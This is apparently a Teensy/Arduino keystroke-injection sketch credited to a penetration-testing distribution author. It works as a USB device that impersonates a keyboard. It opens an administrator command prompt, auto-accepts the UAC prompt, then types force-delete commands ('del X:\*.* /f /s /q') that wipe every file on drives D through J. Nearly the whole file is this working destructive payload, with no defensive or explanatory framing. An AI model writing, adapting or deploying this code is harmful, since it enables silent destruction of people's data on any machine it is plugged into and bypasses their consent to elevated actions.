/*
Script Edit By : Edo Maland  [ Screetsec ]
Follow me on : www,github.com/Screetsec
Penetration OS from Indonesia : Dracos Linux
Link : www.dracos-linux.org
Forum : forum.dracos-linux.org
*/



int ds = 500;

#if defined(CORE_TEENSY)
#define LED_PIN 13
#endif

void setup()
{

  // allow controlling LED
  pinMode(LED_PIN, OUTPUT);
  // turn the LED on while running
  digitalWrite(LED_PIN, HIGH);

  delay(1000);
  loop();

  delay(3000);
  show_desktop();

  delay(3000);
  cmd_admin();

  delay(3000);
  send_altyes();

  delay(1000);
  Keyboard.print("ipconfig");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();

  delay(1000);
  Keyboard.print("del D:\\*.* /f /s /q");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();


  delay(1000);
  Keyboard.print("del E:\\*.* /f /s /q");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();

  delay(1000);
  Keyboard.print("del F:\\*.* /f /s /q");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();


  delay(1000);
  Keyboard.print("del G:\\*.* /f /s /q");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();


  delay(1000);
  Keyboard.print("del I:\\*.* /f /s /q");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();


  delay(1000);
  Keyboard.print("del J:\\*.* /f /s /q");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();

  delay(1000);
  Keyboard.print("exit");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_key1(0);
  Keyboard.send_now();




}


void show_desktop(){
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.set_key1(KEY_D);
  Keyboard.send_now();
  delay(500);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}
void send_altyes(){
  delay(1000);
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.set_key1(KEY_Y);
  Keyboard.send_now();
  delay(100);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  }

void cmd_admin(){
  Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
  Keyboard.send_now();
  delay(1000);
  Keyboard.set_modifier(0);
  Keyboard.send_now();
  delay(2000);
  Keyboard.print("cmd");

  delay(2000);
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.send_now();
  Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
  Keyboard.send_now();
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();

  delay(200);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
}

void loop(){
    // blink quickly when complete
  digitalWrite(LED_PIN, HIGH);
  delay(ds/2);
  digitalWrite(LED_PIN, LOW);
  delay(ds/2);
}
